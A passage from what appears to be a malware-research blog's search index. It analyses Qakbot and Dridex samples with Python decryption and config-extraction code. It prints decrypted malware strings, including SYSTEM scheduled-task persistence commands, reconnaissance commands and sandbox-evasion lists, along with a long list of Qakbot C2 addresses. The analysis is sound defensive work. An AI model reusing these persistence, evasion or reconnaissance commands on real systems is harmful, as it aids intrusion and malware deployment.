e3d4e8f103113519f509f5acb46a0e612d5392d5ecdc979dfd56bcf2b596af64401866db8f4199fa1ba23963d01b36a4099ea6583cdd144a4342ee005ed7be6000b94a3630fe602335628667982e221b5f5930e2518fe1813b79b5203ca52271f12eb17eb38826691d420ef664e2fe3c571d99a28da623e&#39;) print_strings_table(key, data) #print(&quot; n nString lookup(%d): %s&quot; % (1246, string_lookup(key, data, 1246))) string_lookup(key, data, 708) . %s &#34;$%s = &#34;%s &#34;; &amp; $%s&#34; powershell.exe schtasks.exe /Create /RU &#34;NT AUTHORITY SYSTEM&#34; /SC ONSTART /TN %u /TR &#34;%s&#34; /NP /F Self test FAILED!!! ProgramData Microsoft whoami /all Red Hat VirtIO;QEMU net localgroup SOFTWARE Microsoft Windows NT CurrentVersion ProfileList error res=&#39;%s&#39; err=%d len=%u Self test OK. arp -a &#34;%s system32 schtasks.exe&#34; /Create /RU &#34;NT AUTHORITY SYSTEM&#34; /tn %s /tr &#34;%s&#34; /SC ONCE /Z /ST %02u:%02u /ET %02u:%02u schtasks.exe /Delete /F /TN %u srvpost.exe;frida-winjector-helper-32.exe;frida-winjector-helper-64.exe route print nslookup -querytype=ALL -timeout=10 _ldap._tcp.dc._msdcs.%s nltest /domain_trusts /all_trusts 5812 3719 .lnk netstat -nao c: ProgramData at.exe %u:%u &#34;%s&#34; /I System32 WindowsPowerShell v1.0 powershell.exe amstream.dll net view /all qwinsta %s %04x.%u %04x.%u res: %s seh_test: %u consts_test: %d vmdetected: %d createprocess: %d cmd /c set /c ping.exe -n 6 127.0.0.1 &amp; type &#34;%s System32 calc.exe&#34; &gt; &#34;%s&#34; System32 WindowsPowerShell v1.0 powershell.exe SOFTWARE Microsoft Windows CurrentVersion Run jHxastDcds)oMc=jvh7wdUhxcsdt2 artifact.exe;mlwr_smpl;sample;sandbox;cuckoo-;virus Virtual ProfileImagePath VIRTUAL-PC ipconfig /all net share A3E64E55_pr;VBoxVideo %s &#34;$%s = &#34;%s ; &amp; $%s &#34; /t4 regsvr32.exe -s . &#39; System32 WindowsPowerShell v1.0 powershell.exe&#39; . Decrypt RSA Public Key . key = unhex(&#39;60441b6a08752e227c50334a08122d395a&#39;) data = unhex(&#39;50c61a483878282b56d67bccff1f2c3861411b698a7421224cd232400a902c386087aa879d75c99ad8e04da00fecffa6838a0df6c32da3251b749690f07c6d027e3a0b5f1e1ac2522a396702b35bc678b0defb6a2b21e8a69b668a06c48612b593c4495f476d5697d5719c35b7125a4a25b62a44244188381473f8acca2a414c20b49e16dc57378d2f742b77aa0b059c2582068062d5bdb42bf959b0fc89fe6cdddb9965248ecda9ea64103bbfc6b53d14bbee029a68e7f382bcc1ab20a4d6d776359d0b6a1b4fdb71ec45093199a066c70119e1cac7164bbb41af1a35b076b667022298addc67a9e71ca25e9e7eca2c592d1ec28a501394b7a36fde1ed22e5746fe08172aa6ef0685c5d59c98b0658f1f4cb9a5506f0d5c31177379f91569473f46186b08740000&#39;) out = [] for i in range(len(data)): out.append(key[i % len(key)] ^ data[i]) tohex(bytes(out)) . b&#39;30820122300d06092a864886f70d01013b215f72e07c540c6eae627340983e1559ddcac3861fc1eff6c231f03ca6f7b4aeb357968736c92d6e5ab4eca04f270a6c1732057e5ed938224c4920cf0bf532b8ccd6537141acbdf16eff28e6fa4286d9cc5b727e3736d3ce1b94409930261a16fc22560978d258506892a4bf0463307087d41ece7a0ed74f30301da27e2bbe59d235ca6ac7908d71991dab96818b42ffa7c9566e86df84d33e707fa4acbd483a999252a922efe1af859bcb64bfbcdf031bbf773a2805d363c17c5351ddbb0ccf7437c3b6972501b35382236fd032ad0d0a57b68fa0379aad14b073a724aa68424716b7a4726fc484e967cc33eb743702e5621f5f88cd7ad5f69f948a9d5cd57f08a2cf581a237e4d474033f107447e65265c70627c752e&#39; . RC4 Decryption . def rc4crypt(data, key): #If the input is a string convert to byte arrays if type(data) == str: data = data.encode(&#39;utf-8&#39;) if type(key) == str: key = key.encode(&#39;utf-8&#39;) x = 0 box = list(range(256)) for i in range(256): x = (x + box[i] + key[i % len(key)]) % 256 box[i], box[x] = box[x], box[i] x = 0 y = 0 out = [] for c in data: x = (x + 1) % 256 y = (y + box[x]) % 256 box[x], box[y] = box[y], box[x] out.append(c ^ box[(box[x] + box[y]) % 256]) return bytes(out) . Config Extraction . import pefile import hashlib import struct SAMPLE_FILE_PATH = &#39;/tmp/qakbot.bin&#39; data = open(SAMPLE_FILE_PATH, &#39;rb&#39;).read() pe = pefile.PE(data=data) # Get the encrypted config from resource rt_string_idx = [ entry.id for entry in pe.DIRECTORY_ENTRY_RESOURCE.entries ].index(pefile.RESOURCE_TYPE[&#39;RT_RCDATA&#39;]) rt_string_directory = pe.DIRECTORY_ENTRY_RESOURCE.entries[rt_string_idx] resource_data = None # The resource name is hardcoded -- needs to be dynamic for entry in rt_string_directory.directory.entries: if str(entry.name) == &#39;3719&#39;: data_rva = entry.directory.entries[0].data.struct.OffsetToData size = entry.directory.entries[0].data.struct.Size resource_data = pe.get_memory_mapped_image()[data_rva:data_rva+size] # Build decryption key -- change to dynamic extraction key_string = rb&#39; System32 WindowsPowerShell v1.0 powershell.exe&#39; m = hashlib.sha1() m.update(key_string) key_bytes = m.digest() out = rc4crypt(resource_data, key_bytes) # Config has a SHA1 intergrity check followed by binary ip addresses print(&quot;Config SHA1: %s&quot; % tohex(out[:20])) ip_table = out[21:] for ptr in range(0,len(ip_table),7): ip_string = &quot;%d.%d.%d.%d&quot; % (ord(ip_table[ptr:ptr+1]), ord(ip_table[ptr+1:ptr+2]), ord(ip_table[ptr+2:ptr+3]), ord(ip_table[ptr+3:ptr+4])) port_string = struct.unpack(&#39;&gt;H&#39;, ip_table[ptr+4:ptr+6])[0] print(&quot;%s:%s&quot; % (ip_string,port_string)) . Config SHA1: b&#39;ffe5a5fda14380c41fe6fcf4b5c0032ba5e22efe&#39; 32.221.229.7:443 140.82.49.12:443 24.152.219.253:995 182.56.99.126:443 76.169.147.192:32103 218.101.110.3:995 89.101.97.139:443 82.152.39.39:443 176.24.150.197:443 96.37.113.36:993 68.186.192.69:443 59.88.168.108:443 75.110.250.187:443 182.191.92.203:995 89.165.88.95:443 103.142.10.177:443 45.9.20.200:2211 24.95.61.62:443 194.36.28.26:443 78.101.82.198:2222 37.211.157.100:61202 70.163.1.219:443 31.215.99.73:443 103.143.8.71:6881 59.6.7.83:61200 63.153.187.104:443 14.96.79.22:61202 93.48.80.198:995 24.53.49.240:443 94.200.181.154:995 149.135.101.20:443 24.178.196.158:2222 209.210.95.228:32100 78.101.82.198:443 67.209.195.198:443 96.80.109.57:995 80.14.196.176:2222 38.70.253.226:2222 24.222.20.254:443 217.165.123.47:61200 74.15.2.252:2222 217.128.93.27:2222 102.65.38.67:443 190.73.3.148:2222 79.167.192.206:995 95.5.133.68:995 114.79.148.170:443 120.150.218.241:995 186.64.87.213:443 65.100.174.110:443 96.21.251.127:2222 136.232.34.70:443 63.143.92.99:995 65.100.174.110:443 136.143.11.232:443 39.49.27.10:995 111.125.245.116:995 41.228.22.180:443 217.164.247.241:2222 83.110.107.123:443 76.25.142.196:443 74.5.148.57:443 65.128.74.102:443 67.165.206.193:993 173.21.10.71:2222 71.74.12.34:443 94.60.254.81:443 23.233.146.92:443 73.151.236.31:443 79.160.207.214:443 213.120.26.24:443 89.137.52.44:443 75.188.35.168:443 109.12.111.14:443 106.51.48.170:50001 68.204.7.158:443 78.101.82.198:995 96.80.109.57:995 80.6.192.58:443 41.96.250.164:995 114.79.145.28:443 188.54.96.91:443 105.198.236.99:995 50.238.6.36:443 65.100.174.110:8443 70.51.134.181:2222 117.248.109.38:21 83.110.107.123:443 86.98.53.83:443 182.176.180.73:443 217.165.11.65:61200 103.143.8.71:995 50.237.134.22:995 187.189.86.168:443 100.1.119.41:443 2.178.67.97:61202 86.198.237.51:2222 88.253.171.236:995 73.171.4.177:443 40.134.247.125:995 72.252.201.34:995 190.39.205.165:443 187.172.146.123:443 92.167.4.71:2222 189.30.244.252:995 194.36.28.26:443 105.111.124.76:443 84.199.230.66:443 14.96.67.177:443 50.238.6.36:443 182.56.57.23:995 87.70.93.215:443 93.48.58.123:2222 73.5.119.219:443 75.169.58.229:32100 173.71.147.134:995 173.71.147.134:995 69.46.15.180:443 23.82.128.108:443 5.36.7.212:443 200.75.131.234:443 82.77.137.101:995 187.201.90.81:443 24.55.112.61:443 201.172.31.95:443 216.238.72.121:443 216.238.71.31:995 207.246.112.221:443 207.246.112.221:995 216.238.72.121:995 216.238.71.31:443 27.223.92.142:995 216.238.71.31:443 207.246.112.221:995 207.246.112.221:443 216.238.72.121:443 216.238.71.31:995 216.238.72.121:995 24.229.150.54:995 117.198.149.221:443 216.238.71.31:443 207.246.112.221:443 216.238.72.121:443 216.238.71.31:995 207.246.112.221:995 216.238.72.121:995 207.246.112.221:995 216.238.72.121:995 207.246.112.221:443 216.238.71.31:995 . TODO . add dynamic extraction for the decryption key | add dynamic extraction for the resource names | decrypt the other resource | fix ip extraction to use struct | validate the extract configs using the sha1 hash | .",
            "url": "https://research.openanalysis.net/qakbot/qbot/malware/config/2021/12/22/qakbot.html",
            "relUrl": "/qakbot/qbot/malware/config/2021/12/22/qakbot.html",
            "date": " • Dec 22, 2021"
        }
        
    
  
    
        ,"post9": {
            "title": "Dridex (DoppelDridex) Loader",
            "content": "Overview . Sample (unpacked): c7990f1e72fdfa84552f02f9d11cabb74251b0508291af5366fefcee646f9c91 . References: . UnpacMe Parent: 375167a16a6beeee52910d6424eb884c631ada9bcb9843809eecd0475718e549 | Malware Bazaar | Unpacked Sample (Malshare) | Appgate dridex ioc extraction (prior research) | API Resolving blog (Chuong Dong) | Nice extractor from CAPE | . Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . Known Data (Config) From Joe Sandbox . { &quot;Version&quot;: 22201, &quot;C2 list&quot;: [ &quot;103.42.56.15:443&quot;, &quot;169.255.57.61:8116&quot;, &quot;128.199.192.135:6602&quot; ], &quot;RC4 keys&quot;: [ &quot;s6ptqqQ96C42ODZyFUv32gPAVtURlPXrif68ogKV96MSXkXTs&quot;, &quot;rZP9KOr8K1zzIudGa98GqFxsSgNXTDprMuKqtLAWjx1u1prqdOQuZjmv5&quot; ] } . RC4 Decryption . def rc4crypt(data, key): #If the input is a string convert to byte arrays if type(data) == str: data = data.encode(&#39;utf-8&#39;) if type(key) == str: key = key.encode(&#39;utf-8&#39;) x = 0 box = list(range(256)) for i in range(256): x = (x + box[i] + key[i % len(key)]) % 256 box[i], box[x] = box[x], box[i] x = 0 y = 0 out = [] for c in data: x = (x + 1) % 256 y = (y + box[x]) % 256 box[x], box[y] = box[y], box[x] out.append(c ^ box[(box[x] + box[y]) % 256]) return bytes(out) . APLib . Credit: Sandor Nemes (snemes) . import struct from binascii import crc32 from io import BytesIO __all__ = [&#39;APLib&#39;, &#39;decompress&#39;] __version__ = &#39;0.6&#39; __author__ = &#39;Sandor Nemes&#39; class APLib(object): __slots__ = &#39;source&#39;, &#39;destination&#39;, &#39;tag&#39;, &#39;bitcount&#39;, &#39;strict&#39; def __init__(self, source, strict=True): self.source = BytesIO(source) self.destination = bytearray() self.tag = 0 self.bitcount = 0 self.strict = bool(strict) def getbit(self): # check if tag is empty self.bitcount -= 1 if self.bitcount &lt; 0: # load next tag self.tag = ord(self.source.read(1)) self.bitcount = 7 # shift bit out of tag bit = self.tag &gt;&gt; 7 &amp; 1 self.tag &lt;&lt;= 1 return bit def getgamma(self): result = 1 # input gamma2-encoded bits while True: result = (result &lt;&lt; 1) + self.getbit() if not self.getbit(): break return result def depack(self): r0 = -1 lwm = 0 done = False try: # first byte verbatim self.destination += self.source.read(1) # main decompression loop while not done: if self.getbit(): if self.getbit(): if self.getbit(): offs = 0 for _ in range(4): offs = (offs &lt;&lt; 1) + self.getbit() if offs: self.destination.append(self.destination[-offs]) else: self.destination.append(0) lwm = 0 else: offs = ord(self.source.read(1)) length = 2 + (offs &amp; 1) offs &gt;&gt;= 1 if offs: for _ in range(length): self.destination.append(self.destination[-offs]) else: done = True r0 = offs lwm = 1 else: offs = self.getgamma() if lwm == 0 and offs == 2: offs = r0 length = self.getgamma() for _ in range(length): self.destination.append(self.destination[-offs]) else: if lwm == 0: offs -= 3 else: offs -= 2 offs &lt;&lt;= 8 offs += ord(self.source.read(1)) length = self.getgamma() if offs &gt;= 32000: length += 1 if offs &gt;= 1280: length += 1 if offs &lt; 128: length += 2 for _ in range(length): self.destination.append(self.destination[-offs]) r0 = offs lwm = 1 else: self.destination += self.source.read(1) lwm = 0 except (TypeError, IndexError): if self.strict: raise RuntimeError(&#39;aPLib decompression error&#39;) return bytes(self.destination) def pack(self): raise NotImplementedError def aplib_decompress(data, strict=False): packed_size = None packed_crc = None orig_size = None orig_crc = None if data.startswith(b&#39;AP32&#39;) and len(data) &gt;= 24: # data has an aPLib header header_size, packed_size, packed_crc, orig_size, orig_crc = struct.unpack_from(&#39;=IIIII&#39;, data, 4) data = data[header_size : header_size + packed_size] if strict: if packed_size is not None and packed_size != len(data): raise RuntimeError(&#39;Packed data size is incorrect&#39;) if packed_crc is not None and packed_crc != crc32(data): raise RuntimeError(&#39;Packed data checksum is incorrect&#39;) result = APLib(data, strict=strict).depack() if strict: if orig_size is not None and orig_size != len(result): raise RuntimeError(&#39;Unpacked data size is incorrect&#39;) if orig_crc is not None and orig_crc != crc32(result): raise RuntimeError(&#39;Unpacked data checksum is incorrect&#39;) return result . Test Data Decrypt . data = unhex(&#39;991fd7128ac6c8165a9d2daf172ef27944fd14f1fcaed3ff7f8cc4e02e434d439ee2becd4f076605a7bb5e20a2f4a73fa6c59f94cd7729eaa202576c1d33f0fc725fcdccd2b1d4dfb60c11f8d68aa7cc7acd78f97a9f9d777508d3d53c9c5fe6c64bb834f97680548dc6f093328097283261926ff58e662476ec8689b0b136ce9d7a8aa27a884c559fd5a60358f54c150587b89b01d6a3abdb2ec419029df02ce69c9997821cb14c8b2a4bbd74b747921650b98c93b50db1e557aa258b31397fe4ae9fde0f042dc856a2ed2865ccc639820ae7e94042f5deaa9c2d41f6a3034a251d954642e76b48002a2479ad96dea13bb77e74b1c28fbf5c61da648def0b3e99eda2a396594e3f59b3bc5d22c39f7aacc792a4e3db0bacdc5623dc2a333b8de3f27f3075ad2fd2a118b903e1f1f5fed45bde3fc1df0047f05ab27f0617a690440bba697ced12a1003eba57e49b69d40b9e4cbaf640ea8f03a57d2dc3507377ac4732a2eac76a10fc562139b3cc3cf616641feaeae1d580a4092f9ba3dbb0296ac8c7669d5c3635e2b2de5e05c2b2090c470b842be348f8aa35cac0b5a216d089689d88cb4f84d4a399c31d6acdb1bc7f86094fade26c3070bda7a37ae3254f94170f6163e8bef596c9025975d67bdcd1bf35cfdbed3ce789785f6d3c71b0472514dd2672c496d0fff1f5609ad632120c243930e481732ec5791ef33d0e7de20f925dc21f7aeeaea6a08af88ba3ae57863209f07d860cc0a54910043566ad4bdb4287a0fccce20685ec03f350a2fd22d7aaffb17304b5b7466fe317f624d91f53bf8d4d96369c810c0beae24c9307d555963ef0b3fd90fa1e7c99475a4b2c19047b356ca0e1220be20ba501f6e9c7e93a7803066d570be2d9f246a07ac151ec78ed665ab3ca827e6d03fe941b1ccc6e0d1a146c03c5751fe38e12781d34c90bf7636f9e5e322af63ba2e4fe71f6a2dffc05db028d5e3ac27a9a823c3c4471063f41a12263dd6378d32b602b6900d2de732ff215390ac8392fc6309f521e6a35d419dd8eb6a3be617fb48fc1ccbe1d640736b8fec3065a66b119fb7bdbf192bd9efd25c806a5cbb47d2fbcf3f5d2bd6a30a36617cc19bea06730e85417d006a44d35072fdb24dcb358c94b898a2fa80ab797113b636af50350a20cfb54ce441b15d26e62745354c223d342654e534a929ff5140b8bcba469e24794d795065ba8734b84d2063ae762d112fe5415266bab8ae35d10d68df561631acca2e69e61704bc4ee498c1c276c56251d3c7e5314e043bc6281d644e5e38d9fad56cb3284f2d2819b42423bd914bb7e75e46f47fce8f6da23c451d244bb807a5ce4399158f036b9364f6a91022ccc34dea34a2c00a0003c3fb773061c060a426c1ecd5aadbcaaccbe0146057cde291bf5f2968a58bb8d2a3793aa0431b6a5b20357eef157c0ed2340925c6ec1eb083d1edb3fe4fe72c2b9660507dee987cd5b612c5bf1048149c609feb0b658766af44f6368c6fd8ab2be56c4b1b102006681ab2423d9b47b6cda3445f7209c3b61d20f1a5855296a0d8bdae82b44a16e202b266bbd244c7918298b5d27ae28c775ff8f9b03220a9ace2f4e10474ae6db402f4deca0c54553cfabc348f8a3c45cb960b1272fb9434d0168af93a8d0201671b224fdca05281873e7cb5b3bb96a52657ed4de823c65422b44e1302509a8267ca8dc868ae3014add43e25c862210bc54118ab89893aa53f8da4adc008081a5dd95b50db9322f93a90b3daa5d36ce09680e6aad0f2a1bfe79d0136bf99bdeb13572ea6ed03e85f5e124eae9aad92310129a195f1ee97045db33f0acae6f13e7d3c909b9746901116c91b6d594574ba33192d244b82bdd03dc9c8bd88b6515257a95f85314037a6dd12291b9982d05eb87c83defcc47344f0200c4d395ad6fd43dce7475f284bb82e71efbef5aa1d58ce5dad95c5d584997e24629a6879afe7d06b6191564c9ace2ad8db1f64d0a0a6d5df4e7d5bd2868ef48347662e3d8ab3e579962c2a161588fc8fdde43bdf32ff4132aceed418999a5db02d3a38bacbc18360a42bc4f5a0ee6f4ae6d21f824ec237f2e9ca10ada9d9966a6d87a07f9313f6701702f12dd5b8cd1cce1e7cdeeac49bdfa3be62f1ec03d41ab5b7c7914d7ad5723d0e7acd8d2cac1d6473114e6562d08b27b4575864d22ca749ff148dd3478952cb03b663655fcd40cc26c4b444bada92fbbc6bbae16fc56316252dca3bf230c6b24d693f6f285da&#39;) key = data[:48][::-1] data = data[48:] b64_data = rc4crypt(data, key) import base64 import struct cmp_data = base64.b64decode(b64_data) decompressed_data_len = struct.unpack(&#39;&lt;I&#39;,cmp_data[:4]) print(&quot;decompressed data len: %d&quot; % decompressed_data_len) out = aplib_decompress(cmp_data[4:]) SHELLCODE_FILE = &#39;/tmp/dridex_shell1.bin&#39; open(SHELLCODE_FILE, &#39;wb&#39;).write(out) . decompressed data len: 1549 . 1549 . Shellcode Analysis . The loader checks to see if the process is 64 or 32 bit and then decryptes a shellcode blob and injects it along with a struct containing an IAT and other information. . 32bit shellcode (malshare) . To be analyzed... . gap_size = 68 for i in range(0, gap_size, 4): print(f&quot;DWORD dword_{i:0x};&quot;) . DWORD dword_0; DWORD dword_4; DWORD dword_8; DWORD dword_c; DWORD dword_10; DWORD dword_14; DWORD dword_18; DWORD dword_1c; DWORD dword_20; DWORD dword_24; DWORD dword_28; DWORD dword_2c; DWORD dword_30; DWORD dword_34; DWORD dword_38; DWORD dword_3c; DWORD dword_40; . shell_data_2 = unhex(&#39;4b93941a5f7671df49d159c96b178e1c96667e2ab79238f78d625bd468c1f2aee57a345f03721206fdee52034c3453b52c5d1fc76b2785b91e3442b9ea78da4e4f20eccb69cc1c0f2001fe7ccb6e9c5f8977f6fa89358a57ffd44f5c1e29213a3deaeb45160c655972cfcfc04a1260a89eff479e263dd500f6ec1ed713acb5bff9e2de331dc8dee30a67802dd8c66373af26c356d488013d52a220df8609d784ecad7ddeb888d436aa0c5451b69f2f03f51041538f3a2dcaf92db0968e27c81f9c34ee317777acaf53ecba288b5f0803cf29ba6170fe83f96d5c702a1c2aea4ebd21df44c62eb956db897631675f8e3f5f79e2b1498a47043b56d31d146c53fc53751433f89e8e2828c4bab1ddd49b13ec78fe91b890e617c907fde9653527b07d31801d42418e23fb9b2d715ed8b2a07495e102c97b36183e29e2baf47f&#39;) key = shell_data_2[:48][::-1] data = shell_data_2[48:] b64_data = rc4crypt(data, key) import base64 import struct cmp_data = base64.b64decode(b64_data) decompressed_data_len = struct.unpack(&#39;&lt;I&#39;,cmp_data[:4]) print(&quot;decompressed data len: %d&quot; % decompressed_data_len) out = aplib_decompress(cmp_data[4:]) SHELLCODE_FILE_2 = &#39;/tmp/dridex_shell2.bin&#39; open(SHELLCODE_FILE_2, &#39;wb&#39;).write(out) . decompressed data len: 245 . 245 . Test String Decryption . data = unhex(&#39;63208a6488442f57a8414b4928cc1bb9660867a6c23f352adfa702ff121ceee14c69499849e264128bb21bda7fa2a8493244d4377003ec3caae05dc6a76ac7678acd82ca4b2ccceaf0602504576bc9c96223fda05aba4bbff6769f74bc7a3645839a41c4f610217d74d7d203cf38a89af0c05566f5e9301ea7d83f5102e8f324f90d3d38c0773e1a8db5dc6fb5808076269b686b40c6380c37de737d8838e530fac67a&#39;) key = data[:48][::-1] data = data[48:] out = rc4crypt(data, key) for s in out.split(b&#39; x00 x00&#39;): print(s.replace(b&#39; x00&#39;,b&#39;&#39;).decode(&#39;latin-1&#39;)) . ROOT CIMV2 SELECT * FROM Win32_Fan *.dll *.exe ntdll.dll . data = unhex(&#39;95c985f019ba926e4c776a4f39bb87c3af575e04263a3cfbf446fe76cd45826bdfc9c381775b910daa5af895189ac2037f94d7e0cbcb9f04a44b3dade44673637e63d0aeb931ee404dee9737afe9df5fefac345edde26397a125a483bbf9e4a80012c314d14eab1fe2a997e969b313ef290f7700bd7f3a3afb3f8a493f1449ff72a2e5163c632c7a79d450e1f8618cfaa15cba132da34e83c5dfe1aecf4b016b10e489041d096388fb2ada047bc1567732fe4b2c7d7b249be25e74ee1a6ee47abda1b8efd31253186df54c518aa596c5351fbe1cd148ef4bab2645&#39;) key = data[:48][::-1] data = data[48:] out = rc4crypt(data, key) for s in out.split(b&#39; x00 x00&#39;): print(s.replace(b&#39; x00&#39;,b&#39;&#39;).decode(&#39;latin-1&#39;)) . S:(ML;;NW;;;LW)D:(A;;RPWPCCDCLCSWRCWDWOGA;;;S-1-1-0) Sessions %d BaseNamedObjects . data = unhex(&#39;763204228337e0fd87cd26f15d317e7753125863474a2a23cb087289562e629b87de7aebca904d887233a895007c1b7c8b01fc71443ef6ffb96a7a857d8b636bd5a0d3&#39;) key = data[:48][::-1] data = data[48:] out = rc4crypt(data, key) for s in out.split(b&#39; x00 x00&#39;): print(s.replace(b&#39; x00&#39;,b&#39;&#39;).decode(&#39;latin-1&#39;)) . GET POST . data = unhex(&#39;9929d0667cd2bee6ce087b584cfa8d54a813828fe28e53422b76d901b32b276fd6bf3583d4c0078646c3f7e0d908c93f798c881c00a9f7b23498892e6dea7634eaa2b1c7e6c67b34f153c9de05b775602a824dc48d52a7175c86e0112db594a53b7fd4c79689ce1adbd8b8fada3a0c03b8b980fe72f8af41ed8ed3af9a544cdf15c7e3ed8e878f61eaa41b626b5d450e65fd78b8736da4aeb1504d65352e081c877863842ab6adae783a99d525cdeb0eb078f8ee748283ce9554b88e9053b63f4c79e4479f117a341f97d7de18f4276b73ec5db445db5865bb16c8f2d819103d436c1b208cf00ee656e799559082d0996e8d89a07202915cb38ea1f3ad813b08034385703110dba092baf240fb0b8d839a07befcb05830c4a8ee25206c9539c010732a75670c8cba4db4eb8996d7d6f3012971574c3da3fb4a0e5274256ccbe3ee349e1fe5ab7249c78505cee79aa943beca99bdfb52f9aaae4d29ca9b3f26db612a1d866a2162ab96a07ad4a69544b1573c2d6e2c7d0424c97aaa23fbff7b703d4ff88d24dda7&#39;) key = data[:48][::-1] data = data[48:] out = rc4crypt(data, key) for s in out.split(b&#39; x00 x00&#39;): print(s.replace(b&#39; x00&#39;,b&#39;&#39;).decode(&#39;latin-1&#39;)) . Program Manager Progman AdvApi32~PsApi~shlwapi~shell32~WinInet /run /tn &#34;%ws&#34; &#34;%ws&#34; /grant:r &#34;%ws&#34;:F NTUSER.DAT winsxs x86_* amd64_* *.exe Sessions %d BaseNamedObjects . data = unhex(&#39;0921161a62f46e068fcb7050fe9d5fb793d2666a91610f5c75813f2e6a7f6846478262fcb0bd4e0e5ecdb8763266b6dba380102939f258b4e4c6e3c31481976ae308b958793d404c3dfa35a79ac4551495846111e06c4f0e5c4f9dbcf4d26fd2c9d1130852a1bd812f97d6b9b92fb919866f0a1ab95167a0d111c8b214ed78f7a0aaa18dae2ee00fb34974eb3bbc3b778c3f88f4b29dc7d1efd1793d79fa4381e2d991e0115ffc398989f531053028cddcdec0151fa888d249030604224cae2dc1fc6fcb792c4a9943e12ed6c825a69342d275fe8f3652f8f3a79d355f461a67cd3b8b4700236b6d63683e638c5c83c80d0bac05eb7f40298f97e43f4f32af9d125643ebe245a5f65a181d70bcb147f63bcf24552e782565a7dd818a4439471ff4092097aeee12453c802332346c07e80a9b31d631428f299d11b6cdd962654eb918ef68f8e6b786f3c7fc4b473e74cc2721d4a292c1f8ab99e0b5968eb6d3452f1b9a1d12a6a2255281e44f56b7b0b87b30001b19958e6681d5272c560396580c87370eadf68ae1c1022fcb05c781bcf09635b2bd648aa6fa100320c79c6a8f86a7a2bc679dad4a31faa6358b061ca98259ad6497afb43a2a98a5d1a1061c8ada7c4710c32fb7742d68bfb6e0d52f3f56cc9519e75df72c377728c2bfc58aa75bad3b136c2ba610d23c02febad47f1394db071774fa9d058ebd512bc4a411466d2a6582a651a7443cc8a3ae106af4433099f5616d3414c09788359272ac4599c76b8686eeb26ad090de576a3345cf30ad95b8053233ecff47c4315e7d30cd41387e44b241d992625dfd4cf7b0f506797a89e85914d7593cc59e2e089fbbac5a56b96824af9773822e35b948616ff348d1545933b3eb8253c59d29ebfd4001d087a457ff4b49a6eb2b4a9a2d13b1dd3c4d29db90c3ddf4434fa81246f850b719cea0450c30438cf7ca272681a0a6a76ecb6fe7b460f6703f0e3ed0ffe9c43db993e3c07a97405ea42caba91c47070dd9080e32fcd678721a032956bb393c24714c88&#39;) key = data[:48][::-1] data = data[48:] b64_data = rc4crypt(data, key) print(b64_data) out = base64.b64decode(b64_data) print(out) SHELLCODE_FILE = &#39;/tmp/dridex_shell_2.bin&#39; open(SHELLCODE_FILE, &#39;wb&#39;).write(out) . b&#39;o6ijqKOoo6ijqKOoo6ijqKqqqqqqqqqqrKqyqp+fn5+1o6Okqqq6qpaqqKrDw5aWt67WvaPFo6Ofw5yqqqyqvwN/EX8BfwE/AQGQgn2XWVlZWVl/WVlgfX9/WVlZWVlZWVlZWVlZmoh9WVBQUFBZWVlZYZRhnllZhVmSo2BgWVlZWVlZWVlZWVmfAQMBBAPVA8wBvAPwEBAQEFBQUFAUICAgIAEBAQHEAhAAAAAAAQHAwhARAgMRAwMEAAAUAAIAAMbIAgICAgAA/////wAAAP/KAQEBAAYABADAwgEBAwH//wEAA8TExgMBAQH/AwMDyEAACgAEAAAAAH8AMwEAAAAAAAD/v///AAAAAAcAAP8AAAAAAAAAAAAAAAAAAP//AAAAvwAAAAAAAAAAfwAA/0pKSkpLUkpKSkpPTEpKSkpKSkpKVUVASkpKRVlNRkpdSkpKSkpKSkpKSkpKSkphY2dOSkprbUpKRW1KSkRFSkoAAAACDQYGBgYOAAAAAAYGBgAGBgIGAAoKBwcGAgUFAgIAAAQEBAQAAAAOBQYGBgEGAAAIABAAGAAgACgAMACAAYIBhgD2z/4/qwCwALEAswC6+LsAwADBAMe/Yv8Ajf8AxP8Axf8A///rAf8OEggAEwkAFggAFwkAKwkArv8Hsv8AtP8Atf8AwwEAx/+/5wgA8AIA x00 x00&#39; b&#39; xa3 xa8 xa3 xa8 xa3 xa8 xa3 xa8 xa3 xa8 xa3 xa8 xa3 xa8 xa3 xa8 xaa xaa xaa xaa xaa xaa xaa xaa xac xaa xb2 xaa x9f x9f x9f x9f xb5 xa3 xa3 xa4 xaa xaa xba xaa x96 xaa xa8 xaa xc3 xc3 x96 x96 xb7 xae xd6 xbd xa3 xc5 xa3 xa3 x9f xc3 x9c xaa xaa xac xaa xbf x03 x7f x11 x7f x01 x7f x01? x01 x01 x90 x82} x97YYYYY x7fYY`} x7f x7fYYYYYYYYYYYY x9a x88}YPPPPYYYYa x94a x9eYY x85Y x92 xa3``YYYYYYYYYYY x9f x01 x03 x01 x04 x03 xd5 x03 xcc x01 xbc x03 xf0 x10 x10 x10 x10PPPP x14 x01 x01 x01 x01 xc4 x02 x10 x00 x00 x00 x00 x01 x01 xc0 xc2 x10 x11 x02 x03 x11 x03 x03 x04 x00 x00 x14 x00 x02 x00 x00 xc6 xc8 x02 x02 x02 x02 x00 x00 xff xff xff xff x00 x00 x00 xff xca x01 x01 x01 x00 x06 x00 x04 x00 xc0 xc2 x01 x01 x03 x01 xff xff x01 x00 x03 xc4 xc4 xc6 x03 x01 x01 x01 xff x03 x03 x03 xc8@ x00 n x00 x04 x00 x00 x00 x00 x7f x003 x01 x00 x00 x00 x00 x00 x00 xff xbf xff xff x00 x00 x00 x00 x07 x00 x00 xff x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xff xff x00 x00 x00 xbf x00 x00 x00 x00 x00 x00 x00 x00 x7f x00 x00 xffJJJJKRJJJJOLJJJJJJJJUE@JJJEYMFJ]JJJJJJJJJJJJJJacgNJJkmJJEmJJDEJJ x00 x00 x00 x02 r x06 x06 x06 x06 x0e x00 x00 x00 x00 x06 x06 x06 x00 x06 x06 x02 x06 x00 n n x07 x07 x06 x02 x05 x05 x02 x02 x00 x00 x04 x04 x04 x04 x00 x00 x00 x0e x05 x06 x06 x06 x01 x06 x00 x00 x08 x00 x10 x00 x18 x00 x00( x000 x00 x80 x01 x82 x01 x86 x00 xf6 xcf xfe? xab x00 xb0 x00 xb1 x00 xb3 x00 xba xf8 xbb x00 xc0 x00 xc1 x00 xc7 xbfb xff x00 x8d xff x00 xc4 xff x00 xc5 xff x00 xff xff xeb x01 xff 